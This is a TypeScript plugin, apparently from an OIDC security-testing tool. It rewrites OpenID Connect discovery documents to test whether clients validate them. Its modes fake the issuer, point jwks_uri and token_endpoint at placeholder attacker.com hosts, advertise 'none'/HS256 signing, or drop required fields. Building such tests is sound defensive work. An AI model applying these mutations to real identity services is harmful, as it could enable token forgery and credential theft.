/**
 * Discovery Endpoint Confusion Attack
 *
 * Manipulates the OpenID Connect Discovery document (/.well-known/openid-configuration)
 * to test if clients properly validate discovery metadata.
 *
 * Real-world impact: Mix-up attacks, SSRF, misdirection to malicious endpoints
 *
 * Modes:
 * - issuer-mismatch: Returns different issuer than the URL
 * - malicious-jwks: Points jwks_uri to an attacker-controlled endpoint
 * - malicious-token: Points token_endpoint to an attacker-controlled endpoint
 * - weak-algorithms: Advertises only weak/insecure algorithms
 * - remove-required: Removes required fields from discovery
 *
 * Spec: OpenID Connect Discovery 1.0
 * Spec: RFC 8414 - OAuth 2.0 Authorization Server Metadata
 * CWE-295: Improper Certificate Validation (when used for SSRF)
 * CWE-601: URL Redirection to Untrusted Site
 */

import type { MischiefPlugin } from "../types.js";

type DiscoveryMode =
	| "issuer-mismatch"
	| "malicious-jwks"
	| "malicious-token"
	| "weak-algorithms"
	| "remove-required";

export interface DiscoveryDocument {
	issuer: string;
	authorization_endpoint?: string;
	token_endpoint?: string;
	userinfo_endpoint?: string;
	jwks_uri?: string;
	registration_endpoint?: string;
	scopes_supported?: string[];
	response_types_supported?: string[];
	grant_types_supported?: string[];
	subject_types_supported?: string[];
	id_token_signing_alg_values_supported?: string[];
	token_endpoint_auth_methods_supported?: string[];
	claims_supported?: string[];
	[key: string]: unknown;
}

export const discoveryConfusionPlugin: MischiefPlugin = {
	id: "discovery-confusion",
	name: "Discovery Endpoint Confusion",
	severity: "critical",
	phase: "discovery",

	spec: {
		oidc: "OpenID Connect Discovery 1.0",
		rfc: "RFC 8414",
		cwe: "CWE-601",
		description: "Discovery metadata MUST be validated, especially issuer and endpoint URLs",
	},

	description: "Manipulates OIDC discovery document to test metadata validation",

	async apply(ctx) {
		// Discovery plugins receive the discovery document in response.body
		if (!ctx.response?.body) {
			return { applied: false, mutation: "No discovery context", evidence: {} };
		}

		const mode = (ctx.config.mode as DiscoveryMode | undefined) ?? "issuer-mismatch";
		const discovery = ctx.response.body as DiscoveryDocument;
		const originalIssuer = discovery.issuer;

		let mutation: string;
		const evidence: Record<string, unknown> = { mode };

		switch (mode) {
			case "issuer-mismatch": {
				// Return different issuer than expected (mix-up attack)
				const fakeIssuer =
					(ctx.config.fakeIssuer as string | undefined) ?? "https://evil-idp.attacker.com";
				discovery.issuer = fakeIssuer;
				mutation = `Changed issuer from '${originalIssuer}' to '${fakeIssuer}'`;
				evidence.originalIssuer = originalIssuer;
				evidence.fakeIssuer = fakeIssuer;
				break;
			}

			case "malicious-jwks": {
				// Point jwks_uri to attacker-controlled server
				const originalJwks = discovery.jwks_uri;
				const maliciousJwks =
					(ctx.config.maliciousJwksUri as string | undefined) ?? "https://attacker.com/jwks.json";
				discovery.jwks_uri = maliciousJwks;
				mutation = "Changed jwks_uri to attacker-controlled endpoint";
				evidence.originalJwksUri = originalJwks ?? null;
				evidence.maliciousJwksUri = maliciousJwks;
				break;
			}

			case "malicious-token": {
				// Point token_endpoint to attacker-controlled server (credential theft)
				const originalToken = discovery.token_endpoint;
				const maliciousToken =
					(ctx.config.maliciousTokenEndpoint as string | undefined) ?? "https://attacker.com/token";
				discovery.token_endpoint = maliciousToken;
				mutation = "Changed token_endpoint to attacker-controlled endpoint";
				evidence.originalTokenEndpoint = originalToken ?? null;
				evidence.maliciousTokenEndpoint = maliciousToken;
				break;
			}

			case "weak-algorithms": {
				// Advertise only weak/insecure algorithms
				const originalAlgs = discovery.id_token_signing_alg_values_supported;
				discovery.id_token_signing_alg_values_supported = ["none", "HS256"];
				discovery.token_endpoint_auth_methods_supported = ["none", "client_secret_post"];
				mutation = "Set id_token_signing_alg_values_supported to weak algorithms (none, HS256)";
				evidence.originalAlgorithms = originalAlgs ?? null;
				evidence.weakAlgorithms = ["none", "HS256"];
				break;
			}

			case "remove-required": {
				// Remove required fields to test client resilience
				const removedFields: string[] = [];
				const disc = discovery as Record<string, unknown>;
				if (discovery.jwks_uri) {
					evidence.originalJwksUri = discovery.jwks_uri;
					disc.jwks_uri = undefined;
					removedFields.push("jwks_uri");
				}
				if (discovery.response_types_supported) {
					disc.response_types_supported = undefined;
					removedFields.push("response_types_supported");
				}
				if (discovery.subject_types_supported) {
					disc.subject_types_supported = undefined;
					removedFields.push("subject_types_supported");
				}
				mutation = `Removed required fields: ${removedFields.join(", ")}`;
				evidence.removedFields = removedFields;
				break;
			}

			default:
				return {
					applied: false,
					mutation: `Unknown mode: ${mode}`,
					evidence: { mode },
				};
		}

		// Update the response body
		ctx.response.body = discovery;

		evidence.attackType = "discovery-confusion";

		return {
			applied: true,
			mutation,
			evidence,
		};
	},
};
